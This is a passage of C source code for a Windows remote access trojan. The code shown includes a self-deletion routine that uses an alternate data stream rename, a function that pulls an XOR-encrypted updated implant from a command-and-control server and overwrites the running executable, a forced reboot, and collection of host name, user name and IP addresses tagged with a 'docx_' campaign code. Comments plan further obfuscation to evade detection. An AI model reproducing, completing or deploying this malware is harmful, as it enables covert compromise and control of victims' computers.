	pFileRenameInfo->FileNameLength = wcslen(NewStream) * sizeof(wchar_t); //sizeof(NewStream) -> this included the \0 , which is wrong
	RtlCopyMemory(pFileRenameInfo->FileName, NewStream, sizeof(NewStream));
	pFileRenameInfo->ReplaceIfExists = FALSE;
	pFileRenameInfo->RootDirectory = NULL;


	if (GetModuleFileNameW(NULL, PathSize, MAX_PATH * 2) == 0) {
		return;
	}
	/* -------------------- start DELETE I --------------------*/
	HANDLE hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[x] first CreateFileW() failed, err -> %d\n", GetLastError());
		return;
	}

	/*
	THERE IS ISSUE IN PARAMETERS HERE
		solved by correctly assiging pFileRenameInfo->FileNameLength correctly
	*/
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pFileRenameInfo, RenameSize)) {
		printf("[x] first SetFileInformationByHandle() failed, err-> %d\n", GetLastError());
		return;
	}

	CloseHandle(hFile);		// SAVE CHANGES
	/* -------------------- end DELETE I --------------------*/



	/* -------------------- start DELETE II --------------------*/
	WCHAR PathWithStream[MAX_PATH * 2] = { 0 };  // New buffer for path with stream
	wcscpy_s(PathWithStream, MAX_PATH * 2, PathSize);
	wcscat_s(PathWithStream, MAX_PATH * 2, NewStream);

	hFile = CreateFileW(PathWithStream, (DELETE | SYNCHRONIZE), FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[x] second CreateFileW() failed, err -> %d\n", GetLastError());
		return;
	}

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &SetDelete, sizeof(SetDelete))) {
		printf("[x] second SetFileInformationByHandle() failed, err -> %d\n", GetLastError());
		return;
	}
	CloseHandle(hFile);

	if (DeleteFileW(PathSize) == 0) { printf("[x] DeleteFileW() failed, err -> %d\n", GetLastError()); return; }
	//printf("[+] File should be deleted\n");

	/* -------------------- end DELETE II --------------------*/

	BOOL bHeapFree = HeapFree(GetProcessHeap(), 0, pFileRenameInfo);


	return;
}

void GetUpdatedVersionFromC2(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* UpdatedVersionRat) {
	/*THERE IS STILL WORK HERE*/

	int bytes_received = 0;
	// Receive file size
	char recvd_buf[BUFFER_SIZE] = { 0 };
	int file_size = 0;
	bytes_received = recv_func(client_socket, &recvd_buf, sizeof(recvd_buf), 0);
	decrypt(recvd_buf, (SIZE_T)bytes_received);
	file_size = atoi(recvd_buf);
	printf("File size: %lu bytes\n", file_size);
	printf("Available bytes to read: %d\n", bytes_received);

	// Find the last forward slash
	const char* last_slash = strrchr(UpdatedVersionRat, '/');
	//char* FileBaseName = malloc(BUFFER_SIZE);
	char* FileBaseName = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE);
	if (last_slash != NULL) {
		// The UpdatedVersionRat starts after the slash
		strcpy(FileBaseName, last_slash + 1);
		printf("UpdatedVersionRat: %s\n", FileBaseName);
	}
	else {
		// No slash found, entire string is the filename
		strcpy(FileBaseName, UpdatedVersionRat);
		printf("Filename: %s\n", FileBaseName);
	}
	//FullPath should be the exact where the file is running from
	const char* FullPath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE);
	GetModuleFileNameA(NULL, FullPath, BUFFER_SIZE);

	//FullPath should be C:\path\to\exe

// //strcat(FullPath, FileBaseName);
	printf("FULL PATH IS : %s\n", FullPath);
	// Open file for writing
	char okay_buf[BUFFER_SIZE];
	sprintf(okay_buf, "%d", 16000);
	encrypt(okay_buf, (SIZE_T)strlen(okay_buf));

	char err_buf[BUFFER_SIZE] = { 0 };
	FILE* file = fopen(FullPath, "wb");
	if (!file) {
		perror("Failed to open file");
		sprintf(err_buf, "%d", errno);
		encrypt(err_buf, (SIZE_T)strlen(err_buf));
		send_func(client_socket, err_buf, (int)strlen(err_buf), 0);
		return -1;
	}
	send_func(client_socket, okay_buf, (int)strlen(okay_buf), 0);






	// Receive file data
	int remain_data = file_size;

	int WrittenBytes = 0;


	while ((remain_data > 0) && ((bytes_received = recv(client_socket, recvd_buf, BUFFER_SIZE, 0)) > 0))
	{
		decrypt(recvd_buf, (SIZE_T)bytes_received);
		WrittenBytes = fwrite(recvd_buf, sizeof(char), bytes_received, file);
		/*
		if (strlen(recvd_buf) != WrittenBytes) {

			sprintf(err_buf, "%d", errno);
			encrypt(err_buf, (SIZE_T)strlen(err_buf));
			send_func(client_socket, err_buf, (int)strlen(err_buf), 0);

			fclose(file);
			return -1;
		}
		*/
		//send_func(client_socket, okay_buf, (int)strlen(okay_buf), 0);
		remain_data -= bytes_received;
		fprintf(stdout, "Receive %d bytes and we hope :- %d bytes\n", bytes_received, remain_data);
	}




	printf("\nFile received successfully!\n");

	fclose(file);
	//free(FileBaseName);
	BOOL bFirstHeapFree = HeapFree(GetProcessHeap(), 0, FileBaseName);
	BOOL bSecondHeapFree = HeapFree(GetProcessHeap(), 0, FullPath);



	return;
}

DWORD RebootSystem(SOCKET client_socket, FARPROC send_func) {

	// Get necessary privileges
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp = { 0 };
	DWORD err_no = 16000;
	char err_buf[BUFFER_SIZE];
	// Get a token for this process
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken)) {
		printf("OpenProcessToken failed: %lu\n", GetLastError());
		return 1;
	}

	// Get the LUID for the shutdown privilege
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);

	if (GetLastError() != ERROR_SUCCESS) {
		err_no = GetLastError();
		sprintf(err_buf, "%lu", err_no);
		encrypt(err_buf, (SIZE_T)strlen(err_buf));
		printf("AdjustTokenPrivileges failed: %lu\n", GetLastError());
		send_func(client_socket, err_buf, (int)strlen(err_buf), 0);
		return err_no;
	}


	// Reboot the system
	if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE,
		SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
		SHTDN_REASON_MINOR_RECONFIG))
	{
		err_no = GetLastError();
		sprintf(err_buf, "%lu", err_no);
		encrypt(err_buf, (SIZE_T)strlen(err_buf));
		printf("ExitWindowsEx failed: %lu\n", GetLastError());
		send_func(client_socket, err_buf, (int)strlen(err_buf), 0);
		return err_no;
	}
	printf("ExitWindowsEx success\n");

	sprintf(err_buf, "%lu", err_no);
	encrypt(err_buf, (SIZE_T)strlen(err_buf));
	send_func(client_socket, err_buf, (int)strlen(err_buf), 0);

	return (DWORD)0;
}




//https://learn.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
int SysInfo(char* buf, SIZE_T buf_size) {
	DWORD i = 0;
	DWORD bufCharCount = INFO_BUFFER_SIZE;

	// Initialize buffer
	memset(infoBuf, 0, sizeof(infoBuf));

	// Get and display the name of the computer
	if (!GetComputerNameA(infoBuf, &bufCharCount)) {
		printf(TEXT("GetComputerName"));
	}
	//_tprintf(TEXT("\nComputer name:      %s"), infoBuf);

	strcpy_s(buf, buf_size, "Computer Name: ");
	strcat_s(buf, buf_size, infoBuf);
	strcat_s(buf, buf_size, "\n");
	strcat_s(buf, buf_size, "-");



	// Get and display the user name
	bufCharCount = INFO_BUFFER_SIZE;
	memset(infoBuf, 0, sizeof(infoBuf));
	if (!GetUserNameA(infoBuf, &bufCharCount)) {
		printf(TEXT("GetUserName"));
	}
	//_tprintf(TEXT("\nUser name:          %s"), infoBuf);

	strcat_s(buf, buf_size, "Username: ");
	strcat_s(buf, buf_size, infoBuf);
	strcat_s(buf, buf_size, "\n");
	strcat_s(buf, buf_size, "-");
	return 0;
}

void GetLocalIP(char* buf, SIZE_T buf_size) {


	// Remember to add offset obfuscation to that and delete the pragma static linking to ws2_32.dll

	WSADATA wsaData;
	char hostname[256];
	struct hostent* host;
	struct in_addr** addr_list;


	// Initialize Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed.\n");
		return;
	}


	// Get local hostname
	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
		printf("gethostname failed.\n");
		WSACleanup();
		return;
	}

	//printf("Hostname: %s\n", hostname);

	// Get IP addresses
	host = gethostbyname(hostname);
	if (host == NULL) {
		printf("gethostbyname failed.\n");
		WSACleanup();
		return;
	}

	// Get all IPv4 addresses
	addr_list = (struct in_addr**)host->h_addr_list;


	strcat_s(buf, buf_size, "local IP Addresses:\n");

	for (int i = 0; addr_list[i] != NULL; i++) {

		strcat_s(buf, buf_size, inet_ntoa(*addr_list[i]));
		strcat_s(buf, buf_size, "\n");
	}
	strcat_s(buf, buf_size, "-");

	WSACleanup();


	return;
}

void GetCampaginCode(char* buf, SIZE_T buf_size) {

	time_t t = time(NULL);
	struct tm* tm = localtime(&t);
	char buffer[100];


	strftime(buffer, sizeof(buffer), "%d/%m/%Y", tm);      // 15/01/2024
	//printf("European format: %s\n", buffer);

	strcat_s(buf, buf_size, "docx_");
	strcat_s(buf, buf_size, buffer);
	strcat_s(buf, buf_size, "\n");
	strcat_s(buf, buf_size, "-");

	return;
}

void decrypt(unsigned char* recv_buf, SIZE_T recv_buf_size) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < recv_buf_size; i++) {
		//printf("\\x%02x", magic[i] ^ key);
		recv_buf[i] = recv_buf[i] ^ TRAFFIC_KEY;
	}
	//printf("\n");
	return;
}
void encrypt(unsigned char* recv_buf, SIZE_T recv_buf_size) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < recv_buf_size; i++) {
		//printf("\\x%02x", magic[i] ^ key);
		recv_buf[i] = recv_buf[i] ^ TRAFFIC_KEY;
	}
	//printf("\n");
	return;
}

